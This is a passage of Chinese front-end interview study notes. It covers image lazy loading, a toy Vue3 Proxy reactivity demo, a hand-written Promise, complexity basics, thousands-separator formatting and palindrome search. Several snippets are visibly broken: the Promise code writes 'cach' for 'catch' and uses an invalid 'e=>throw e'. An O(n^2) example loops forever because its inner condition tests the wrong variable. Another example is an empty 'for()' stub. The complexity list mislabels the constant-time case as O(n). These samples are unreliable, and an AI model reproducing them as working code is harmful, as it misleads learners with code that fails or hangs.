  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal2.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal3.jpeg<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal4.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal5.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>item-container<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>新闻标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/loading.gif<span class="token punctuation">&quot;</span></span> <span class="token attr-name">data-src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>./img/animal6.webp<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://cdn.bootcdn.net/ajax/libs/lodash.js/4.17.21/lodash.min.js<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">function</span> <span class="token function">mapImagesAndTryLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> images <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'img[data-src]'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>images<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span>

    images<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">img</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> rect <span class="token operator">=</span> img<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>rect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 漏出来</span>
        <span class="token comment">// console.info('loading img', img.dataset.src)</span>
        img<span class="token punctuation">.</span>src <span class="token operator">=</span> img<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>src
        img<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'data-src'</span><span class="token punctuation">)</span> <span class="token comment">// 移除 data-src 属性，为了下次执行时减少计算成本</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// 滚动需要节流</span>
  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'scroll'</span><span class="token punctuation">,</span> _<span class="token punctuation">.</span><span class="token function">throttle</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">mapImagesAndTryLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

  <span class="token comment">// 初始化默认执行一次</span>
  <span class="token function">mapImagesAndTryLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><h3 id="手写vue3基本响应式原理"><a href="#手写vue3基本响应式原理" class="header-anchor">#</a> 手写Vue3基本响应式原理</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 简单实现</span>

<span class="token keyword">var</span> fns <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> activeFn

<span class="token keyword">function</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> res <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>key<span class="token punctuation">,</span>receiver<span class="token punctuation">)</span> <span class="token comment">// 相当于target[key]</span>

      <span class="token comment">// 懒递归 取值才执行</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> res <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> res <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">reactive</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>

      <span class="token keyword">if</span><span class="token punctuation">(</span>activeFn<span class="token punctuation">)</span> fns<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>activeFn<span class="token punctuation">)</span>

      <span class="token keyword">return</span> res
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      fns<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">fn</span> <span class="token operator">=&gt;</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 触发effect订阅的回调函数的执行</span>
      <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">effect</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  activeFn <span class="token operator">=</span> fn
  <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 执行一次去取值，触发proxy get</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 测试</span>

<span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'poetries'</span><span class="token punctuation">,</span><span class="token literal-property property">info</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token function">effect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment">// 修改属性，自动触发effect内部函数执行</span>
user<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'张三'</span>
<span class="token comment">// user.info.age = 10 // 修改深层次对象</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span> user<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'李四'</span><span class="token punctuation">}</span><span class="token punctuation">)</span> 
</code></pre></div><h3 id="实现一个简洁版的promise"><a href="#实现一个简洁版的promise" class="header-anchor">#</a> 实现一个简洁版的promise</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 三个常量用于表示状态</span>
<span class="token keyword">const</span> <span class="token constant">PENDING</span> <span class="token operator">=</span> <span class="token string">'pending'</span>
<span class="token keyword">const</span> <span class="token constant">RESOLVED</span> <span class="token operator">=</span> <span class="token string">'resolved'</span>
<span class="token keyword">const</span> <span class="token constant">REJECTED</span> <span class="token operator">=</span> <span class="token string">'rejected'</span>

<span class="token keyword">function</span> <span class="token function">MyPromise</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> that <span class="token operator">=</span> <span class="token keyword">this</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token constant">PENDING</span>

    <span class="token comment">// value 变量用于保存 resolve 或者 reject 中传入的值</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token keyword">null</span>

    <span class="token comment">// 用于保存 then 中的回调，因为当执行完 Promise 时状态可能还是等待中，这时候应该把 then 中的回调保存起来用于状态改变时使用</span>
    that<span class="token punctuation">.</span>resolvedCallbacks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    that<span class="token punctuation">.</span>rejectedCallbacks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>


    <span class="token keyword">function</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token comment">// 首先两个函数都得判断当前状态是否为等待中</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token constant">PENDING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            that<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token constant">RESOLVED</span>
            that<span class="token punctuation">.</span>value <span class="token operator">=</span> value

            <span class="token comment">// 遍历回调数组并执行</span>
            that<span class="token punctuation">.</span>resolvedCallbacks<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">cb</span><span class="token operator">=&gt;</span><span class="token function">cb</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token constant">PENDING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            that<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token constant">REJECTED</span>
            that<span class="token punctuation">.</span>value <span class="token operator">=</span> value
            that<span class="token punctuation">.</span>rejectedCallbacks<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">cb</span><span class="token operator">=&gt;</span><span class="token function">cb</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 完成以上两个函数以后，我们就该实现如何执行 Promise 中传入的函数了</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token function">fn</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span>reject<span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token function">cach</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">reject</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 最后我们来实现较为复杂的 then 函数</span>
<span class="token class-name">MyPromise</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">then</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">onFulfilled<span class="token punctuation">,</span>onRejected</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">const</span> that <span class="token operator">=</span> <span class="token keyword">this</span>

  <span class="token comment">// 判断两个参数是否为函数类型，因为这两个参数是可选参数</span>
  onFulfilled <span class="token operator">=</span> <span class="token keyword">typeof</span> onFulfilled <span class="token operator">===</span> <span class="token string">'function'</span> <span class="token operator">?</span> <span class="token function-variable function">onFulfilled</span> <span class="token operator">:</span> <span class="token parameter">v</span><span class="token operator">=&gt;</span>v
  onRejected <span class="token operator">=</span> <span class="token keyword">typeof</span> onRejected <span class="token operator">===</span> <span class="token string">'function'</span> <span class="token operator">?</span> <span class="token function-variable function">onRejected</span> <span class="token operator">:</span> <span class="token parameter">e</span><span class="token operator">=&gt;</span><span class="token keyword">throw</span> e

  <span class="token comment">// 当状态不是等待态时，就去执行相对应的函数。如果状态是等待态的话，就往回调函数中 push 函数</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token constant">PENDING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>resolvedCallbacks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>onFulfilled<span class="token punctuation">)</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>rejectedCallbacks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>onRejected<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token constant">RESOLVED</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">onFulfilled</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">===</span> <span class="token constant">REJECTED</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">onRejected</span><span class="token punctuation">(</span>that<span class="token punctuation">.</span>value<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre></div><h2 id="_13-算法题"><a href="#_13-算法题" class="header-anchor">#</a> 13 算法题</h2> <h3 id="时间复杂度与空间复杂度基本概念"><a href="#时间复杂度与空间复杂度基本概念" class="header-anchor">#</a> 时间复杂度与空间复杂度基本概念</h3> <p><strong>什么是复杂度</strong></p> <ul><li>程序执行需要的计算量和内存空间</li> <li>复杂度是数量级（方便记忆推广）不是具体的数字</li> <li>一般针对一个具体的算法，而非一个完整的系统</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/6ce62d970d0719f4.png" loading="lazy" class="lazy"></p> <p><strong>时间复杂度-程序执行时需要的计算量（CPU）</strong></p> <ul><li><code>O(n)</code>一次就够（数量级）</li> <li><code>O(n)</code>和传输的数据一样（数量级）</li> <li><code>O(n^2)</code>数据量的平方（数量级）</li> <li><code>O(logn)</code>数据量的对数（数量级）</li> <li><code>O(n*logn)</code>数据量*数据量的对数（数量级）</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// O(1)</span>
  <span class="token keyword">return</span> obj<span class="token punctuation">.</span>a <span class="token operator">+</span> obj<span class="token punctuation">.</span>b
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">fn2</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// O(n)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 一层for循环</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">fn3</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// O(n^2)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 二层for循环</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">fn4</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 二分 O(logn)</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>空间复杂度-程序执行时需要的内存空间</strong></p> <ul><li><code>O(1)</code>有限的、可数的空间（数量级）</li> <li><code>O(n)</code>和输入的数据量相同的空间（数量级）</li></ul> <h3 id="实现数字千分位格式化"><a href="#实现数字千分位格式化" class="header-anchor">#</a> 实现数字千分位格式化</h3> <ul><li>将数字千分位格式化，输出字符串</li> <li>如输入数字<code>13050100</code>输出<code>13,050,100</code></li> <li>注意：逆序判断（从后往前判断）</li></ul> <p><strong>思路分析</strong></p> <ul><li>转化为数组，<code>reverse</code>，每三位拆分</li> <li>使用正则表达式</li> <li>使用字符串拆分</li></ul> <p><strong>性能分析</strong></p> <ul><li>使用数组，转化影响性能</li> <li>使用正则表达式，性能较差</li> <li>使用字符串性能较好，推荐答案</li></ul> <p><strong>划重点</strong></p> <ul><li>顺序，从尾到头</li> <li>尽量不要转化数据结构</li> <li>慎用正则表达式，性能较慢</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 千分位格式化（使用数组）
 * @param n number
 */</span>
<span class="token keyword">function</span> <span class="token function">format1</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  n <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token comment">// 只考虑整数</span>

  <span class="token keyword">const</span> s <span class="token operator">=</span> n<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 13050100</span>
  <span class="token keyword">const</span> arr <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 反转数组逆序判断，从尾到头 00105031</span>
  <span class="token keyword">return</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">prev<span class="token punctuation">,</span> val<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">// 分析</span>
    <span class="token comment">// index = 0   prev = ''           val = '0'      return '0'</span>
    <span class="token comment">// index = 1   prev = '0'          val = '0'      return '00'</span>
    <span class="token comment">// index = 2   prev = '00'         val = '1'      return '100'</span>
    <span class="token comment">// index = 3   prev = '100'        val = '0'      return '0,100'</span>
    <span class="token comment">// index = 4   prev = '0,100'      val = '5'      return '50,100'</span>
    <span class="token comment">// index = 5   prev = '50,100'     val = '0'      return '050,100'</span>
    <span class="token comment">// index = 6   prev = '050,100'    val = '3'      return '3,050,100'</span>
    <span class="token comment">// index = 7   prev = '3,050,100'  val = '1'      return '13,050,100'</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//每隔三位加一个逗号</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>prev<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> val <span class="token operator">+</span> <span class="token string">','</span> <span class="token operator">+</span> prev 
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> val
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> val <span class="token operator">+</span> prev
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>获取1-10000之前所有的对称数（回文数）</strong></p> <ul><li>求<code>1-10000</code>之间所有的对称数（回文）</li> <li>例如：<code>0,1,2,11,22,101,232,1221...</code></li></ul> <p><strong>思路分析</strong></p> <ul><li>思路1：使用数组反转比较
<ul><li>数字转为字符串，在转为数组</li> <li>数组<code>reverse</code>，在<code>join</code>为字符串</li> <li>前后字符串进行对比</li> <li>看似是<code>O(n)</code>,但数组转换、操作都需要时间，所以慢</li></ul></li> <li>思路2：字符串前后比较
<ul><li>数字转为字符串</li> <li>字符串头尾字符比较</li> <li>思路2 vs 思路3，直接操作数字更快</li></ul></li> <li>思路3：生成翻转数
<ul><li>使用<code>%</code>和<code>Math.floor()</code>生成翻转数</li> <li>前后数字进行对比</li> <li>全程操作数字，没有字符串类型</li></ul></li></ul> <p><strong>总结</strong></p> <ul><li>尽量不要转换数据结构，尤其是数组这种有序结构</li> <li>尽量不要用内置API，如<code>reverse</code>等不好识别复杂度</li> <li>数字操作最快，其次是字符串</li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 查询 1-max 的所有对称数（数组反转）
 * @param max 最大值
 */</span>
<span class="token keyword">function</span> <span class="token function">findPalindromeNumbers1</span><span class="token punctuation">(</span><span class="token parameter">max</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> max<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 转换为字符串，转换为数组，再反转，比较</span>
    <span class="token keyword">const</span> s <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">===</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 反过来看是否和之前的一样就是回文</span>
      res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
